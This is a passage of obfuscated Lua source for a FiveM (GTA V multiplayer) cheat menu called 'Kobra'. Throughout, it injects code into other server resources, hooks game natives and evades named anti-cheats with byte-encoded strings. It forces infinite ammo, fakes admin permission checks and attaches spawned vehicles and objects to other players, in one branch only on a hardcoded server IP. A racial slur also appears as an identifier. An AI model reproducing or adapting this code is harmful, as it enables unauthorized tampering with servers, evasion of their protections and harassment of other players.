hNative(v1226,v1227) local v1228=_G[v1226];if ( not v1228 or (type(v1228)~="function")) then return;end _G[v1226]=function(...) return v1227(v1228,...);end;end hNative("CreateThread",function(v1229,...) return v1229(...);end);hNative("Wait",function(v1230,...) return v1230(...);end);hNative("IsVehicleSeatFree",function(v1231,...) return v1231(...);end);v1104=4 -3 ;end if (v1104==(10 -3)) then if _G.KobraFreecamObject then local v1308=0 -0 ;while true do if (v1308==(819 -(599 + 220))) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v1104==(7 -3)) then hNative("EndTextCommandDisplayText",function(v1232,...) return v1232(...);end);hNative("GetCamCoord",function(v1233,...) return v1233(...);end);hNative("GetCamRot",function(v1234,...) return v1234(...);end);hNative("IsControlPressed",function(v1235,...) return v1235(...);end);hNative("GetDisabledControlNormal",function(v1236,...) return v1236(...);end);hNative("TaskStandStill",function(v1237,...) return v1237(...);end);v1104=5;end if (v1104==5) then hNative("SetFocusPosAndVel",function(v1238,...) return v1238(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1239,...) return v1239(...);end);hNative("GetShapeTestResult",function(v1240,...) return v1240(...);end);hNative("IsControlJustPressed",function(v1241,...) return v1241(...);end);hNative("IsDisabledControlJustPressed",function(v1242,...) return v1242(...);end);hNative("IsEntityAVehicle",function(v1243,...) return v1243(...);end);v1104=1937 -(1813 + 118) ;end if (v1104==(1 + 0)) then hNative("PlayerPedId",function(v1244,...) return v1244(...);end);hNative("GetEntityCoords",function(v1245,...) return v1245(...);end);hNative("CreateCam",function(v1246,...) return v1246(...);end);hNative("SetCamCoord",function(v1247,...) return v1247(...);end);hNative("SetCamRot",function(v1248,...) return v1248(...);end);hNative("RenderScriptCams",function(v1249,...) return v1249(...);end);v1104=2;end if (v1104==3) then hNative("SetTextEdge",function(v1250,...) return v1250(...);end);hNative("SetTextOutline",function(v1251,...) return v1251(...);end);hNative("SetTextCentre",function(v1252,...) return v1252(...);end);hNative("SetTextColour",function(v1253,...) return v1253(...);end);hNative("BeginTextCommandDisplayText",function(v1254,...) return v1254(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1255,...) return v1255(...);end);v1104=1221 -(841 + 376) ;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v979,v980) local v981=_G[v979];if ( not v981 or (type(v981)~="function")) then return;end _G[v979]=function(...) return v980(v981,...);end;end hNative("CreateThread",function(v982,...) return v982(...);end);hNative("Wait",function(v983,...) return v983(...);end);hNative("IsVehicleSeatFree",function(v984,...) return v984(...);end);hNative("PlayerPedId",function(v985,...) return v985(...);end);hNative("GetEntityCoords",function(v986,...) return v986(...);end);hNative("CreateCam",function(v987,...) return v987(...);end);hNative("SetCamCoord",function(v988,...) return v988(...);end);hNative("SetCamRot",function(v989,...) return v989(...);end);hNative("RenderScriptCams",function(v990,...) return v990(...);end);hNative("DestroyCam",function(v991,...) return v991(...);end);hNative("SetFocusEntity",function(v992,...) return v992(...);end);hNative("SetTextFont",function(v993,...) return v993(...);end);hNative("SetTextProportional",function(v994,...) return v994(...);end);hNative("SetTextScale",function(v995,...) return v995(...);end);hNative("SetTextDropShadow",function(v996,...) return v996(...);end);hNative("SetTextEdge",function(v997,...) return v997(...);end);hNative("SetTextOutline",function(v998,...) return v998(...);end);hNative("SetTextCentre",function(v999,...) return v999(...);end);hNative("SetTextColour",function(v1000,...) return v1000(...);end);hNative("BeginTextCommandDisplayText",function(v1001,...) return v1001(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1002,...) return v1002(...);end);hNative("EndTextCommandDisplayText",function(v1003,...) return v1003(...);end);hNative("GetCamCoord",function(v1004,...) return v1004(...);end);hNative("GetCamRot",function(v1005,...) return v1005(...);end);hNative("IsControlPressed",function(v1006,...) return v1006(...);end);hNative("GetDisabledControlNormal",function(v1007,...) return v1007(...);end);hNative("TaskStandStill",function(v1008,...) return v1008(...);end);hNative("SetFocusPosAndVel",function(v1009,...) return v1009(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1010,...) return v1010(...);end);hNative("GetShapeTestResult",function(v1011,...) return v1011(...);end);hNative("IsControlJustPressed",function(v1012,...) return v1012(...);end);hNative("IsDisabledControlJustPressed",function(v1013,...) return v1013(...);end);hNative("IsEntityAVehicle",function(v1014,...) return v1014(...);end);hNative("TaskWarpPedIntoVehicle",function(v1015,...) return v1015(...);end);hNative("SetEntityCoords",function(v1016,...) return v1016(...);end);hNative("GiveWeaponToPed",function(v1017,...) return v1017(...);end);hNative("SetCurrentPedWeapon",function(v1018,...) return v1018(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1019,...) return v1019(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;end SetFocusEntity(PlayerPedId());end break;end if (v521==(0 + 0)) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v521=2 -1 ;end end end end;v12.EnableInfiniteAmmo=function(v197) if (GetResourceState("WaveShield")=="started") then print("1");local function v522(v592) local v593=859 -(464 + 395) ;local v594;while true do if (v593==0) then v594="";for v927=2 -1 , #v592 do v594=v594   .. string.char(v592[v927]) ;end v593=1 + 0 ;end if (v593==1) then return v594;end end end local function v523(v595) return _G[v522(v595)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v524=v523({80,108,332 -235 ,281 -160 ,101,1396 -(74 + 1208) ,379 -299 ,101,490 -(14 + 376) ,73,100});local v525=v523({71,295 -194 ,116,83,76 + 25 ,255 -147 ,68 + 33 ,89 + 10 ,37 + 79 ,270 -169 ,100,80,183 -82 ,23 + 77 ,87,101,97,214 -102 ,48 + 63 ,94 + 16 });local v526=v523({71,176 -75 ,116,72,133 -36 ,115,1327 -(109 + 1114) ,75,343 -(6 + 236) ,77 + 44 });local v527=v523({167 -96 ,1234 -(1076 + 57) ,20 + 96 ,6 + 59 ,58 + 51 ,109,111,73,49 + 61 ,72 + 8 ,311 -210 ,235 -135 ,210 -123 ,101,188 -91 ,11 + 101 ,628 -(440 + 77) ,402 -292 });local v528=v523({65,77 + 23 ,402 -302 ,221 -156 ,438 -329 ,109,258 -147 ,84,410 -(176 + 123) ,80,74 + 27 ,28 + 72 });local v529=v523({68,196 -85 ,314 -213 ,430 -(306 + 9) ,69,20 + 90 ,56 + 60 ,105,74 + 42 ,121,121 -(33 + 19) ,359 -239 ,47 + 58 ,115,109 + 7 });local v530=v523({8 + 79 ,97,323 -218 ,209 -93 });local v531={};local function v532(v596) local v597=0;local v598;local v599;while true do if ((0 + 0)==v597) then v598=coroutine.create(v596);v599=nil;v597=2 -1 ;end if (1==v597) then function v599() while coroutine.status(v598)~="dead"  do local v1020,v1021=coroutine.resume(v598);if  not v1020 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v1021);break;end v530(0 + 0 );end end v599();break;end end end if  not _G.osintWaveLoop then _G.osintWaveLoop=true;v532(function() while _G.osintWaveLoop do if _G.osintInfAmmo.enabled then local v1022=0 -0 ;local v1023;while true do if (v1022==0) then v1023=v524();if v529(v1023) then local v1256=v525(v1023);if (v1256 and (v1256~=v526("WEAPON_UNARMED"))) then local v1325=0 -0 ;local v1326;local v1327;local v1328;while true do if (v1325==(610 -(295 + 314))) then if  not v531[v1328] then v531[v1328]=v1327;end if (v1327<v531[v1328]) then v528(v1023,v1256,v531[v1328] -v1327 );end break;end if (v1325==(0 -0)) then v1326,v1327=v527(v1023,v1256);v1328=tostring(v1023);v1325=1963 -(1300 + 662) ;end end end end break;end end else coroutine.yield();end coroutine.yield();end end);end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v198) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v199,v200,v201) if ( not v200 or ( #v200==(0 -0))) then local v533=1755 -(1178 + 577) ;while true do if (v533==0) then v199:Notify("error","Kobra","No players selected!",1558 + 1442 );return;end end end if ( not v201 or ( #v201==(0 -0))) then v199:Notify("error","Kobra","Invalid vehicle model!",3000);return;end local function v202(v322) local v323=0;local v324;while true do if (v323==1) then return table.concat(v324,",");end if ((1405 -(851 + 554))==v323) then v324={};for v755=1, #v322 do v324[v755]=string.byte(v322,v755);end v323=1 + 0 ;end end end local v203=v201;local v204=v202(v203);local v205=GetCurrentServerEndpoint();local v206=0;for v325,v326 in ipairs(v200) do if (GetResourceState("solos-rentals")=="started") then print("[vehicle_attach] Fallback: solos-rentals");local v600,v601=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v204,v326));end);if v600 then v206=v206 + 1 ;end elseif (GetResourceState("amigo")=="started") then local v757=0;local v758;local v759;while true do if (v757==0) then print("[vehicle_attach] Fallback: Amigo RP");v758,v759=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v204,v326));end);v757=2 -1 ;end if (v757==(1 -0)) then if v758 then v206=v206 + (303 -(115 + 187)) ;end break;end end elseif (GetResourceState("qb-core")=="started") then local v928=0 + 0 ;local v929;local v930;while true do if (v928==(1 + 0)) then if v929 then v206=v206 + (3 -2) ;end break;end if (v928==(1161 -(160 + 1001))) then print("[vehicle_attach] Fallback #02");v929,v930=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v204,v326));end);v928=1 + 0 ;end end elseif ((v205:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1105=0;local v1106;local v1107;while true do if (v1105==(0 + 0)) then print("[vehicle_attach] Fallback #1");v1106,v1107=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v204,v326));end);v1105=1 -0 ;end if (v1105==1) then if v1106 then v206=v206 + (359 -(237 + 121)) ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1164=897 -(525 + 372) ;local v1165;local v1166;while true do if (v1164==0) then print("[vehicle_attach] Fallback #2");v1165,v1166=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v204,v326));end);v1164=1 -0 ;end if (v1164==1) then if v1165 then v206=v206 + (3 -2) ;end break;end end elseif (GetResourceState("lation_laundering")=="started") then local v1257=0;local v1258;local v1259;while true do if (v1257==1) then if v1258 then v206=v206 + (143 -(96 + 46)) ;end break;end if (v1257==(777 -(643 + 134))) then print("[vehicle_attach] Fallback #3");v1258,v1259=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v204,v326));end);v1257=1;end end else local v1260=0 + 0 ;local v1261;local v1262;while true do if (v1260==1) then if v1261 then v206=v206 + (2 -1) ;end break;end if (v1260==0) then print("[vehicle_attach] Universal Fallback");v1261,v1262=pcall(function() local v1417=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v204,v326);MachoInjectResourceRaw("any",v1417,v326);end);v1260=3 -2 ;end end end end end;function encodeToByteArrayLiteral(v207) if  not v207 then return "";end if (type(v207)~="string") then return tostring(v207);end if ( #v207==(0 + 0)) then return "";end local v208={};for v327=1 -0 , #v207 do v208[ #v208 + 1 ]=tostring(string.byte(v207,v327));end return table.concat(v208,", ");end v12.SpawnSelectedObject=function(v209,v210) if ( not v210 or ( #v210==(0 -0))) then v209:Notify("error","Kobra","No players selected!",3719 -(316 + 403) );return;end local v211=v209:GetSelectedObjectModel();if ( not v211 or ( #v211==(0 + 0))) then v209:Notify("error","Kobra","Invalid object model!",3000);return;end local v212=encodeToByteArrayLiteral(v211);local v213=0 -0 ;for v329,v330 in ipairs(v210) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then local v602=0;while true do if (v602==(0 + 0)) then v209:Notify("error","Kobra","Using Qb-core Spawner!",7555 -4555 );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v212,v330));v602=1 + 0 ;end if (v602==(1 + 0)) then v213=v213 + 1 ;break;end end elseif (GetResourceState("cd_dispatch")=="started") then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v212,v330));v213=v213 + (3 -2) ;elseif (GetResourceState("rcore_drunk")=="started") then local v931=0 -0 ;while true do if ((0 -0)==v931) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v211,v330));v213=v213 + 1 ;break;end end elseif (GetResourceState("lc_fuel")=="started") then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v211,v330));v213=v213 + 1 + 0 ;elseif (GetResourceState("0r-illegalpack")=="started") then local v1167=0;while true do if (v1167==(0 -0)) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v211,v330));v213=v213 + 1 + 0 ;break;end end elseif (GetResourceState("xradio")=="started") then local v1263=0;while true do if ((0 -0)==v1263) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v211,v330));v213=v213 + 1 ;break;end end else local v1264=17 -(12 + 5) ;while true do if (v1264==(0 -0)) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
